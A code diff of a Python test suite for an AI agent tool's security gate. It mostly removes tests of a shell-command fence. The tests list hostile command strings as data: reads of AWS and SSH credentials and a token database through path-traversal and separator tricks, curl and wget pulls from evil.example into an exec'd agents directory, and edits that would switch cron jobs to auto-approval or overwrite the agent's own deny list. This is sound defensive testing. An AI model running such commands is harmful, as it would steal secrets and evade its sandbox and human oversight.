-            is_sensitive_bash_command("type 'C:\\Users\\u\\AppData\\Local\\kiro-cli\\data.sqlite3'")
-            is not None
-        )
-
-    def test_backslash_relative_traversal_is_blocked(self) -> None:
-        assert is_sensitive_bash_command("type ..\\..\\.aws\\credentials") is not None
-        assert (
-            is_sensitive_bash_command("type ..\\..\\AppData\\Roaming\\kiro-cli\\data.sqlite3")
-            is not None
-        )
-        # The POSIX spelling keeps matching through the widened alternation.
-        assert is_sensitive_bash_command("dd if=../../.aws/credentials") is not None
-
-    def test_benign_native_spellings_stay_allowed(self) -> None:
-        assert is_sensitive_bash_command("type 'C:\\Users\\u\\project\\readme.md'") is None
-        assert is_sensitive_bash_command("python -c \"open(r'C:\\temp\\x.txt')\"") is None
-
-    def test_down_up_traversal_reentry_is_blocked(self) -> None:
-        # A same-level excursion (X\..) is a canonical no-op, so a spelling
-        # that re-enters the fenced location still names it.
-        cmds = [
-            (
-                "python -c \"open(r'C:\\Users\\u\\AppData\\Roaming\\..\\Roaming"
-                "\\kiro-cli\\data.sqlite3','w')\""
-            ),
-            "type 'C:\\Users\\u\\.aws\\..\\.aws\\credentials'",
-            'del "%APPDATA%\\..\\Roaming\\kiro-cli\\data.sqlite3"',
-        ]
-        for cmd in cmds:
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.skipif(
-        os.name != "nt",
-        reason="fence targets are os.sep-joined; the match is only real on Windows",
-    )
-    def test_backslash_spelling_of_fenced_dirs_is_blocked_on_windows(self) -> None:
-        # Single quotes keep the backslashes literal through POSIX shlex, so
-        # the token reaches is_sensitive_path() in its native spelling.
-        home = str(Path.home())
-        for fenced in (".aws\\credentials", "AppData\\Roaming\\kiro-cli\\data.sqlite3"):
-            cmd = f"type '{home}\\{fenced}'"
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-
-class TestWindowsSeparatorRuns:
-    """A repeated path separator names the same file the single one does.
-
-    Win32 collapses a separator run, so ``kiro-cli`` and ``\\\\kiro-cli`` and
-    ``//kiro-cli`` are one entry. The fence matched RAW text with exactly one
-    separator per boundary, so a doubled separator anywhere in the chain reached
-    the fenced store while matching no branch (#6350) -- including the live SSO
-    bearer-token database under ``AppData\\Local\\kiro-cli``.
-
-    Asserted as a MATRIX rather than per spelling, because closing these one at
-    a time is what produced the previous shape: every anchor times every run
-    shape times every boundary position. The whole class is host-independent --
-    the raw pass never reads ``os.name`` -- so these run and mean the same thing
-    on the Linux and macOS runners as on Windows. What a non-Windows host
-    CANNOT show is Win32 actually collapsing the run; that equivalence is
-    assumed from the platform contract, and these tests pin the matcher's side
-    of it.
-    """
-
-    #: Every anchor the Windows branches accept, in a spelling that needs no
-    #: host support: the generic drive-letter home, the cmd.exe and PowerShell
-    #: profile variables, and the POSIX-ish anchors the raw pass also allows.
-    ANCHORS = (
-        r"C:\Users\u",
-        "%USERPROFILE%",
-        "$env:USERPROFILE",
-        "~",
-        "$HOME",
-    )
-    #: Separator runs. Two and three backslashes, the forward-slash spelling,
-    #: and both mixed orders -- Win32 treats all of them as one boundary.
-    RUNS = ("\\\\", "\\\\\\", "//", "\\/", "/\\")
-
-    @staticmethod
-    def _double_nth_separator(path: str, index: int) -> str:
-        """Return *path* with its *index*-th backslash doubled."""
-        head, tail = "", path
-        for _ in range(index + 1):
-            cut = tail.index("\\")
-            head += tail[: cut + 1]
-            tail = tail[cut + 1 :]
-        return f"{head}\\{tail}"
-
-    @pytest.mark.parametrize("run", RUNS)
-    @pytest.mark.parametrize("fenced", (r".aws\credentials", r".ssh\id_rsa"))
-    def test_a_run_right_after_the_anchor_still_names_the_store(
-        self, run: str, fenced: str
-    ) -> None:
-        # The report measured the leak on the alias branch and the home-anchored
-        # branch alike, so the run is exercised against EVERY anchor. ``.aws``
-        # and ``.ssh`` were reported as unaffected; they are not -- the report
-        # only doubled the separator before the LEAF, which the trailing
-        # boundary already absorbed.
-        for anchor in self.ANCHORS:
-            cmd = f'type "{anchor}{run}{fenced}"'
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("fenced", [d for d in security._SENSITIVE_HOME_DIRS if "/" in d])
-    def test_a_run_at_every_inter_segment_boundary_is_blocked(self, fenced: str) -> None:
-        # A doubled separator immediately before the LEAF was already blocked
-        # (the trailing boundary absorbs one), which is why the gap read as
-        # narrower than it was. Walk EVERY boundary of a multi-segment fenced
-        # dir instead of trusting one position.
-        native = "\\".join(fenced.split("/"))
-        path = f"C:\\Users\\u\\{native}\\data.sqlite3"
-        boundaries = path.count("\\")
-        assert boundaries >= 4, path
-        for index in range(boundaries):
-            spelling = self._double_nth_separator(path, index)
-            cmd = f'type "{spelling}"'
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("run", RUNS)
-    def test_the_appdata_alias_branches_tolerate_a_run(self, run: str) -> None:
-        # ``%LOCALAPPDATA%`` names the CURRENT kiro-cli store, and the alias
-        # branches carry their own anchor-specific no-op excursion
-        # (``\..\Roaming``), which has its own separators.
-        for var, product in (("%APPDATA%", "kiro-cli"), ("%LOCALAPPDATA%", "kiro-cli")):
-            cmd = f'type "{var}{run}{product}\\data.sqlite3"'
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-        for cmd in (
-            f'type "%APPDATA%\\..{run}Roaming\\kiro-cli\\data.sqlite3"',
-            f'type "%APPDATA%{run}..\\Roaming\\kiro-cli\\data.sqlite3"',
-            f'type "%LOCALAPPDATA%\\..{run}Local\\kiro-cli\\data.sqlite3"',
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("run", RUNS)
-    def test_a_run_composes_with_the_canonical_no_ops(self, run: str) -> None:
-        # The generalized separator already accepted ``\.`` and ``\X\..``
-        # excursions. A run at the seam between an excursion and the next
-        # segment is the same equivalence one level in.
-        for cmd in (
-            f'type "%LOCALAPPDATA%\\.{run}kiro-cli\\data.sqlite3"',
-            f'type "C:\\Users\\u\\.aws\\..{run}.aws\\credentials"',
-            f'type "C:\\Users\\u{run}.aws\\..\\.aws\\credentials"',
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("run", RUNS)
-    def test_the_anchorless_relative_traversal_matcher_tolerates_a_run(self, run: str) -> None:
-        # The relative matcher has no anchor to lean on, so its own traversal
-        # prefix and segment joins each need the run: ``..\\.aws\credentials``
-        # is the same file ``..\.aws\credentials`` is.
-        for cmd in (
-            f"cat ..{run}.aws\\credentials",
-            f"cat ..{run}..\\.ssh\\id_rsa",
-            f"cat ..\\AppData{run}Local\\kiro-cli\\data.sqlite3",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("run", RUNS)
-    def test_the_windows_write_gates_tolerate_a_run(self, run: str) -> None:
-        # ``~/.kiro/agents`` is a code-execution boundary, not a read fence: a
-        # planted spec becomes a command the gateway execs outside the
-        # per-session sandbox. The crew variable-leaf branch is the same shape
-        # with a computed leaf.
-        for cmd in (
-            f'echo x > "C:\\Users\\u\\.kiro{run}agents\\evil.json"',
-            f'echo x > "%USERPROFILE%\\.kiro{run}agents\\evil.json"',
-            f'echo x > "$env:KIRO_HOME{run}agents\\evil.json"',
-            f'echo x > "%USERPROFILE%\\.kiro\\crew{run}%F%"',
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("leaf", security._WRITE_PROTECTED_BASH_LEAVES)
-    def test_the_write_protected_leaves_tolerate_a_run(self, leaf: str) -> None:
-        for prefix in (".kiro\\crew", ".kirocrew"):
-            cmd = f'echo forged > "C:\\Users\\u\\{prefix}\\\\{leaf}"'
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_the_resolved_home_literal_anchor_tolerates_a_run(self) -> None:
-        # A home that is NOT under ``Users``/``home`` has only the resolved
-        # literal to match on. The PATTERN spells one separator, so a run is
-        # handled by collapsing the SUBJECT first -- this asserts the
-        # composition, which is what the gate actually evaluates. Built through
-        # ``_build_sensitive_regex`` directly: it is a pure function of the
-        # home, so no module cache is disturbed and no Windows host is needed.
-        with mock.patch.object(security.Path, "home", return_value=Path("D:\\profiles\\u")):
-            pattern = security._build_sensitive_regex()
-        for spelling in (
-            r"D:\profiles\\u\.aws\credentials",
-            r"D:\profiles\u\\.aws\credentials",
-            r"D:\profiles\\u\\.ssh\id_rsa",
-            # A MIXED run: collapsing to one fixed separator left this unmatched,
-            # because the escaped home literal wants a backslash (found in
-            # review). Both spellings are emitted, so one of them matches.
-            r"D:/\profiles\u\.aws\credentials",
-        ):
-            cmd = f'type "{spelling}"'
-            variants = security._separator_collapsed_variants(cmd)
-            assert any(pattern.search(v) for v in variants), spelling
-        # The single-separator spelling needs no collapsing at all, and an
-        # unrelated profile on the same drive is not the fenced home either way.
-        assert pattern.search(r'type "D:\profiles\u\.aws\credentials"')
-        assert not pattern.search(r'type "D:\profiles\u2\notes.txt"')
-        assert not any(
-            pattern.search(v)
-            for v in security._separator_collapsed_variants(r'type "D:\profiles\\u2\notes.txt"')
-        )
-
-    def test_benign_paths_with_a_run_stay_allowed(self) -> None:
-        # Widening a deny boundary can only deny more, so the controls matter:
-        # a run in an ordinary path must not become a refusal, and a name that
-        # merely starts with a fenced one is a different directory.
-        for cmd in (
-            r'type "C:\src\myproj\\README.md"',
-            r'type "%LOCALAPPDATA%\\Microsoft\Edge\prefs.json"',
-            r'type "C:\Users\u\\Documents\notes.txt"',
-            r'type "C:\Users\u\\.awsx\notes.txt"',
-            r'type "C:\Users\u\\.kiro\agentsx\notes.txt"',
-            r"cat ..\\docs\readme.md",
-            r'type "C:\Users\\u2\Documents\a.txt"',
-        ):
-            assert is_sensitive_bash_command(cmd) is None, cmd
-
-    def test_a_run_does_not_smuggle_an_extraction_into_the_trust_root(self) -> None:
-        # The extraction check is a SEPARATE control from the path matcher, so
-        # repeating only the matcher over the collapsed copy let a doubled
-        # separator carry an archive into the governance root (found in review).
-        for cmd in (
-            "tar -xf evil.tar -C $HOME//.kiro/crew",
-            "tar -xf evil.tar -C ~//.kiro//crew",
-            "tar -xzf evil.tar -C $HOME/\\.kiro/crew",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("run", ("//", "\\\\", "\\/", "/\\"))
-    def test_a_mixed_run_is_normalized_to_both_separators(self, run: str) -> None:
-        # A run made of both characters collapses to neither spelling on its own,
-        # so both are emitted. Exercised through the real gate, not the helper.
-        cmd = f'type "%LOCALAPPDATA%{run}kiro-cli\\data.sqlite3"'
-        assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_a_unc_path_with_an_interior_run_is_still_fenced(self) -> None:
-        # A UNC path BEGINS with two separators that its anchor requires, so
-        # collapsing them broke every UNC spelling that also had an interior run:
-        # the original missed on the interior run and the collapsed copy had no
-        # UNC prefix left, so the keystone read was permitted (found in review).
-        for cmd in (
-            r'type "\\server\share\.kiro\\crew\security_policy.json"',
-            r'type "\\server\share\.kiro\crew\\security_policy.json"',
-            r'type "//server/share/.kiro//crew/security_policy.json"',
-            r'cat "\\srv\homes\u\\.ssh\id_rsa"',
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    @pytest.mark.parametrize("gap", ("\n", "\r", "\r\n", "\v", "\f", " ", "\t"))
-    def test_a_unc_path_after_any_whitespace_boundary_is_still_fenced(self, gap: str) -> None:
-        # The leading-run test above quotes the path, so the character before
-        # the UNC prefix is always ``"``. A multi-line command puts it after a
-        # NEWLINE instead, and the boundary class used to enumerate only space
-        # and tab -- so the prefix read as interior, every variant destroyed the
-        # UNC anchor, and the doubled spelling was permitted while the single
-        # one was blocked. Asserted over the whole whitespace class, both the
-        # read fence and the agents-directory WRITE gate, because enumerating
-        # is what produced the gap: \r, \v and \f were missing for the same reason.
-        for cmd in (
-            f"Get-Content `{gap}\\\\server\\share\\.kiro\\\\crew\\security_policy.json",
-            f"Get-Content `{gap}//server//share//.kiro//crew//security_policy.json",
-            f"Set-Content `{gap}\\\\server\\share\\.kiro\\\\agents\\evil.json -Value x",
-            f"cat `{gap}\\\\srv\\homes\\u\\\\.ssh\\id_rsa",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, repr(cmd)
-        # The control: the single-separator spelling of the same file at the
-        # same boundary was ALWAYS blocked. Pinned so a future change cannot
-        # close the gap by relaxing this side instead.
-        for cmd in (
-            f"Get-Content `{gap}\\\\server\\share\\.kiro\\crew\\security_policy.json",
-            f"Set-Content `{gap}\\\\server\\share\\.kiro\\agents\\evil.json -Value x",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, repr(cmd)
-
-    @pytest.mark.parametrize("gap", ("\n", "\r", "\v", "\f"))
-    def test_a_benign_unc_path_after_a_whitespace_boundary_stays_allowed(self, gap: str) -> None:
-        # The fence must not widen past the boundary gap: an unfenced UNC path
-        # on a continuation line keeps being allowed in both spellings.
-        for cmd in (
-            f"Get-Content `{gap}\\\\server\\share\\project\\readme.md",
-            f"Get-Content `{gap}\\\\server\\share\\project\\\\readme.md",
-            f"Get-Content `{gap}//server//share//project//readme.md",
-        ):
-            assert is_sensitive_bash_command(cmd) is None, repr(cmd)
-
-    def test_the_unchanged_unc_spelling_still_matches(self) -> None:
-        # The control: a UNC path with no interior run needs no collapsing and
-        # must keep matching on the original command.
-        cmd = r'type "\\server\share\.kiro\crew\security_policy.json"'
-        assert is_sensitive_bash_command(cmd) is not None
-
-    def test_a_pathological_separator_run_is_decided_quickly(self) -> None:
-        # The run classes are DISJOINT from the name run (which excludes
-        # separators) and from ``.``, so admitting one-or-more adds no
-        # quantifier ambiguity. Pinned because a starred group holding an
-        # ambiguous adjacent pair is exponential, and this file has been there:
-        # an exponential shape shows as seconds at a few hundred characters.
-        for payload in (
-            "\\" * 400,
-            "\\." * 200,
-            "\\a\\.." * 100,
-            "\\" * 200 + "." * 200,
-        ):
-            cmd = f'type "%LOCALAPPDATA%{payload}X"'
-            start = time.perf_counter()
-            is_sensitive_bash_command(cmd)
-            elapsed = time.perf_counter() - start
-            assert elapsed < 2.0, f"{elapsed:.2f}s on {len(cmd)} chars"
-
-
-class TestBareTokenProtectedLeaves:
-    """The distinctive leaves are refused by NAME, with no anchor required.
-
-    Every other leaf branch needs a home anchor plus a crew prefix, so one ``cd`` walks
-    around all of them: after ``cd ~/.kiro/crew`` a relative ``echo forged >
-    connections-tool-aliases.json`` names no home, no prefix and no separator. For the
-    alias ownership record that is not a residual limit to accept the way it is for
-    credential paths -- the file IS the deletion grant (``alias_record.load_claimed``
-    returns the pairs the rebuild may strip from the spec), so the contract is about the
-    FILENAME: any command naming it as a path segment is refused, and anchoring is not
-    part of the contract.
-    """
-
-    def test_relative_redirect_after_cd_is_blocked(self) -> None:
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"cd ~/.kiro/crew && echo forged > {leaf}",
-                f"cd $HOME/.kiro/crew; echo forged >> {leaf}",
-                # no space between the operator and the target
-                f"cd ~/.kirocrew && echo forged >{leaf}",
-                f"cd ~/.kiro/crew && echo forged > '{leaf}'",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bare_name_with_any_verb_is_blocked(self) -> None:
-        # Verb-independent, like the anchored branches: naming the file is the signal,
-        # so a novel or forgotten write verb cannot slip past an enumerated list.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"tee {leaf}",
-                f"touch {leaf}",
-                f"rm -f {leaf}",
-                f"mv /tmp/forged.json {leaf}",
-                f"cp /tmp/forged.json {leaf}",
-                f"cat {leaf}",
-                f"python -c \"open('{leaf}','w')\"",
-                f"install -m 600 /tmp/forged.json {leaf}",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_subdir_relative_spellings_are_blocked(self) -> None:
-        # A path SEPARATOR before the name is the common bare-relative spelling and is
-        # outside the ``[\s'\"=:,;]`` token anchor the anchored branches use.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"echo forged > ./{leaf}",
-                f"tee ./{leaf}",
-                f"cp /tmp/f.json crew/{leaf}",
-                f"echo forged > ../crew/{leaf}",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_windows_relative_spelling_is_blocked(self) -> None:
-        # Host-independent: the raw pass never depends on the runner's OS, and a
-        # backslash-relative name carries no anchor for the Windows leaf branch either.
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            for cmd in (
-                f"echo forged > .\\{leaf}",
-                f'copy /Y evil.json ".\\{leaf}"',
-                f"echo forged > crew\\{leaf}",
-                f"python -c \"open(r'.\\{leaf}','w')\"",
-            ):
-                assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_unrelated_names_and_crew_content_stay_allowed(self) -> None:
-        # Bare-token matching is deliberately narrow: it fences ONE distinctive
-        # filename, not the crew home and not every name that contains it.
-        assert is_sensitive_bash_command("touch ~/.kiro/crew/sessions.db") is None
-        assert is_sensitive_bash_command("touch ~/.kirocrew/sessions.db") is None
-        assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
-        for leaf in security._BARE_TOKEN_PROTECTED_LEAVES:
-            # a DIFFERENT file whose name merely ends with the protected one
-            assert is_sensitive_bash_command(f"touch my-{leaf}") is None
-            assert is_sensitive_bash_command(f"cat legacy-{leaf}") is None
-            # a longer name that merely starts with it
-            assert is_sensitive_bash_command(f"cat {leaf}x") is None
-            assert is_sensitive_bash_command(f"cat {leaf}5") is None
-
-    def test_generic_leaves_are_not_bare_matched(self) -> None:
-        # SCOPE GUARD: bare-token matching is only safe for a globally distinctive
-        # name. Admitting a generic leaf (``index.json``, ``config.json``,
-        # ``rotation.yaml``) would refuse a large fraction of ordinary commands, so the
-        # tuple must never grow one -- and the anchored forms must keep working.
-        for generic in ("index.json", "config.json", "rotation.yaml"):
-            assert generic not in security._BARE_TOKEN_PROTECTED_LEAVES
-            assert is_sensitive_bash_command(f"touch {generic}") is None
-        for leaf in security._WRITE_PROTECTED_BASH_LEAVES:
-            for prefix in security.crew_home_prefixes():
-                anchored = f"echo forged > ~/{prefix}/{leaf}"
-                assert is_sensitive_bash_command(anchored) is not None, anchored
+            assert not hasattr(security, name), name
 
 
 class TestKiroAgentsDirWriteProtection:
-    """``~/.kiro/agents`` is WRITE-protected on both the file-edit and bash gates.
+    """``~/.kiro/agents`` is WRITE-protected on the file-edit tool gate.
 
     A spec planted there names a ``command`` the MCP gateway execs — a pooled
     backend runs OUTSIDE the per-session sandbox, as the user — so an agent write
     is a persistent, unsandboxed code-exec vector. WRITES are refused. Tool-path
     READS stay allowed (the dir is on the write-only tier, NOT in
-    ``_SENSITIVE_HOME_DIRS``), so spec discovery / the dashboard MCP rows work;
-    the bash gate matches verb-independently (naming the dir is the signal, so
-    ``curl``/``wget``/``python -c open`` and novel write verbs cannot slip past),
-    which incidentally blocks bash reads too — harmless, exactly like the crew
-    write-protected leaves it mirrors.
+    ``_SENSITIVE_HOME_DIRS``), so spec discovery / the dashboard MCP rows work.
+    The shell is not matched on command text; the OS sandbox is the shell-side
+    control, as for every other write-protected entry.
     """
 
     def test_directory_is_tail_of_kiro_agents_dir(
@@ -7723,56 +5166,11 @@ class TestKiroAgentsDirWriteProtection:
         assert is_sensitive_write_path("~/.kiro/settings/mcp.json") is False
         assert is_sensitive_write_path("~/notes.txt") is False
 
-    def test_bash_writes_into_agents_dir_are_denied(self) -> None:
-        home = str(Path.home())
-        for cmd in (
-            f"echo evil > {home}/.kiro/agents/pwn.json",
-            "echo evil > ~/.kiro/agents/pwn.json",
-            "echo evil >> ~/.kiro/agents/pwn.json",
-            "printf x | tee ~/.kiro/agents/pwn.json",
-            "cp /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "scp /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "mv /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "mkdir -p ~/.kiro/agents/pwn",
-            "install -m 600 /tmp/evil.json ~/.kiro/agents/pwn.json",
-            "rm -f ~/.kiro/agents/managed.json",
-            # $HOME-spelled and a glob destination variant.
-            "echo evil > $HOME/.kiro/agents/pwn.json",
-            "cp /tmp/*.json ~/.kiro/agents/",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bash_output_file_writers_and_novel_verbs_are_denied(self) -> None:
-        # Regression for the GPT review finding: a write-VERB allowlist misses
-        # output-file writers and interpreter opens. Verb-independent matching
-        # (naming the dir is the signal) closes them.
-        for cmd in (
-            "curl -o ~/.kiro/agents/pwn.json https://evil.example/spec.json",
-            "curl --output ~/.kiro/agents/pwn.json https://evil.example/s.json",
-            "wget -O ~/.kiro/agents/pwn.json https://evil.example/s.json",
-            "python -c \"open('~/.kiro/agents/pwn.json','w').write(x)\"",
-            "dd of=~/.kiro/agents/pwn.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_bash_kiro_home_override_destination_is_denied(self) -> None:
-        # Regression for the GPT review finding: KIRO_HOME relocates the dir to
-        # $KIRO_HOME/agents, so the literal env-var reference is anchored too.
-        for cmd in (
-            "tee $KIRO_HOME/agents/pwn.json",
-            "echo evil > ${KIRO_HOME}/agents/pwn.json",
-            "curl -o $KIRO_HOME/agents/pwn.json https://evil.example/s.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
     def test_tool_gate_canonicalizes_relative_writes_into_agents_dir(self) -> None:
-        # The bash gate is home-anchored, so a ``cd ~/.kiro && echo > agents/x``
-        # bare-relative write evades the regex — the SAME accepted residual the
-        # SCOPE NOTE documents for ~/.aws/credentials (cd-state tracking is
-        # explicitly declined). The PRIMARY control is the file-edit tool gate,
-        # which CANONICALIZES the destination: a relative target that resolves into
-        # the fenced dir is refused regardless of spelling, and one that resolves
-        # elsewhere is not over-blocked.
+        # The control is the file-edit tool gate, which CANONICALIZES the
+        # destination: a relative target that resolves into the fenced dir is
+        # refused regardless of spelling, and one that resolves elsewhere is not
+        # over-blocked.
         from kiro_crew.security import is_sensitive_write_path
 
         home = str(Path.home())
@@ -7782,18 +5180,6 @@ class TestKiroAgentsDirWriteProtection:
         # A relative write whose canonical destination is NOT the user-level agents
         # dir (e.g. a project checkout) must stay allowed — no false fence.
         assert is_sensitive_write_path("agents/pwn.json", base_dir="/tmp/project") is False
-
-    def test_bash_naming_agents_dir_is_blocked_but_tool_reads_stay_allowed(self) -> None:
-        # The bash gate matches verb-independently, so a bash READ of the dir is
-        # blocked too (harmless: no secret, Python readers only) — the same
-        # tradeoff the crew write-protected leaves accept. The read-ALLOWANCE that
-        # matters (the file viewer, knowledge indexing, is_sensitive_path) lives on
-        # the tool path and is unaffected, asserted here so the asymmetry is pinned.
-        assert is_sensitive_bash_command("cat ~/.kiro/agents/foo.json") is not None
-        assert is_sensitive_path("~/.kiro/agents/foo.json") is False
-        # A DIFFERENT directory that merely shares the ``agents`` prefix is not
-        # over-blocked on the bash gate.
-        assert is_sensitive_bash_command("cat ~/.kiro/agents-backup/foo.json") is None
 
     def test_kiro_home_override_is_covered_on_the_tool_gate(self, tmp_path, monkeypatch) -> None:
         # kiro_agents_dir() honours KIRO_HOME; the override moves the specs the
@@ -7829,29 +5215,18 @@ class TestDeniedCommandsKeystone:
 
     The opt-out state (``{disable_all, disabled_ids, user_added}``) lives in
     ``~/.kirocrew/denied_commands.json`` on ``_SENSITIVE_HOME_DIRS`` — a full
-    read+write block — NOT in config.json. So the agent can neither read nor
-    write its own deny ceiling via any shell form, inheriting the mature
+    read+write block — NOT in config.json. So the agent's file tools can neither
+    read nor write its own deny ceiling, inheriting the mature
     ``is_sensitive_path`` gate (the same protection level as
-    ``security_policy.json``). This replaces the bespoke bash write-matcher that
-    was needed while the state lived in the agent-readable config.json.
+    ``security_policy.json``), and the OS sandbox mounts it read-only for the
+    shell. This replaces the bespoke bash write-matcher that was needed while the
+    state lived in the agent-readable config.json.
     """
 
     def test_keystone_path_is_sensitive(self) -> None:
         from kiro_crew.security import is_sensitive_path
 
         assert is_sensitive_path("~/.kirocrew/denied_commands.json") is True
-
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        # Full keystone: BOTH reads and writes of the opt-out file are blocked
-        # for the agent (it must not read OR write its own ceiling).
-        for cmd in (
-            "echo x > ~/.kirocrew/denied_commands.json",
-            "tee ~/.kirocrew/denied_commands.json",
-            "cp evil ~/.kirocrew/denied_commands.json",
-            "cat ~/.kirocrew/denied_commands.json",
-            "python -c open ~/.kirocrew/denied_commands.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
 
 
 class TestAuditBashCommand:
@@ -8452,6 +5827,87 @@ class TestApplyResourceLimits:
             _bias_child_oom_score()
         mopen.assert_not_called()
 
+    @staticmethod
+    def _fake_resource(hard: int, *, reject: bool = False):
+        """A stand-in ``resource`` module so the preexec body runs IN-PROCESS.
+
+        The real closure runs post-fork in the child, where coverage cannot
+        see it and where calling it here would cap the test worker itself.
+        """
+        from types import SimpleNamespace
+
+        calls: list[tuple[int, tuple[int, int]]] = []
+
+        def setrlimit(res_id, limits):
+            if reject:
+                raise ValueError("kernel rejected")
+            calls.append((res_id, limits))
+
+        fake = SimpleNamespace(
+            RLIM_INFINITY=-1,
+            RLIMIT_NOFILE=7,
+            getrlimit=lambda _res_id: (100, hard),
+            setrlimit=setrlimit,
+        )
+        return fake, calls
+
+    def test_preexec_clamps_to_the_inherited_hard_cap_and_pins_both_limits(self) -> None:
+        """A request above the hard cap tightens to it; soft AND hard are set so the
+        child cannot raise its own soft limit back up."""
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=512)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == [(7, (512, 512))]
+        bias.assert_called_once_with()
+
+    def test_preexec_leaves_a_request_under_an_infinite_hard_cap_alone(self) -> None:
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=-1)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score"),
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == [(7, (4096, 4096))]
+
+    def test_preexec_swallows_a_rejected_rlimit_so_the_spawn_proceeds(self) -> None:
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        fake, calls = self._fake_resource(hard=512, reject=True)
+        with (
+            patch.object(helpers, "_resource", fake),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            apply_resource_limits({"resource_limits": {"max_open_files": 4096}})()
+        assert calls == []
+        bias.assert_called_once_with()
+
+    def test_preexec_is_a_noop_without_the_resource_module(self) -> None:
+        """Windows has no ``resource``; the limiter must still be a callable."""
+        from unittest.mock import patch
+
+        from kiro_crew.security import helpers
+
+        with (
+            patch.object(helpers, "_resource", None),
+            patch.object(helpers, "_bias_child_oom_score") as bias,
+        ):
+            limiter = apply_resource_limits({"resource_limits": {"max_open_files": 4096}})
+            assert limiter() is None
+        bias.assert_not_called()
+
     @pytest.mark.skipif(sys.platform != "linux", reason="oom_score_adj is Linux-only")
     def test_child_oom_score_adj_biased(self) -> None:
         """The preexec biases the OOM killer toward the child (oom_score_adj
@@ -8942,7 +6398,8 @@ class TestCronStoreProtection:
     protected leaves, an auto-approved shell could bypass both with an ordinary
     file edit. It is on ``_CREW_SECRET_LEAVES`` with its ``cron-history``
     sidecar directory (per-job records plus the index), read+write-blocked on
-    both the tool path and the shell forms. The gateway's own writers open the
+    the tool path and hidden from the shell by the OS sandbox. The gateway's own
+    writers open the
     store directly, not through this gate, so the cron service keeps working;
     the cost is that a human hand-edit through an agent shell is refused, the
     same trade-off every other keystone leaf makes.
@@ -8956,6 +6413,11 @@ class TestCronStoreProtection:
 
         assert "crons.json" in _CREW_SECRET_LEAVES
         assert "cron-history" in _CREW_SECRET_LEAVES
+        # The in-flight markers are the evidence the boot-time loop-stall breaker
+        # pauses a job on, so they are fenced for a sharper reason than the store
+        # itself: a marker the agent could write is an unauthorized "pause this
+        # job", and one it could delete disables the breaker.
+        assert cron_inflight.RUNNING_DIR_NAME in _CREW_SECRET_LEAVES
 
     @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
     def test_store_and_history_sensitive_under_every_home_prefix(self, prefix: str) -> None:
@@ -8964,22 +6426,16 @@ class TestCronStoreProtection:
         assert is_sensitive_path(f"~/{prefix}/crons.json") is True
         assert is_sensitive_path(f"~/{prefix}/cron-history/_index.jsonl") is True
         assert is_sensitive_path(f"~/{prefix}/cron-history/job123.jsonl") is True
+        assert is_sensitive_path(f"~/{prefix}/cron-running/a1b2c3d4.json") is True
         # The write gate is a superset of the read gate; assert it directly so
         # the file-edit tool path is pinned too.
         assert is_sensitive_write_path(f"~/{prefix}/crons.json") is True
         assert is_sensitive_write_path(f"~/{prefix}/cron-history/_index.jsonl") is True
-
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        for cmd in (
-            "echo x > ~/.kiro/crew/crons.json",
-            "tee ~/.kiro/crew/crons.json",
-            "cp evil ~/.kiro/crew/crons.json",
-            'sed -i \'s/"approval_mode": ""/"approval_mode": "auto"/\' ~/.kiro/crew/crons.json',
-            "cat ~/.kiro/crew/crons.json",
-            "echo x > ~/.kiro/crew/cron-history/_index.jsonl",
-            "cat ~/.kirocrew/crons.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
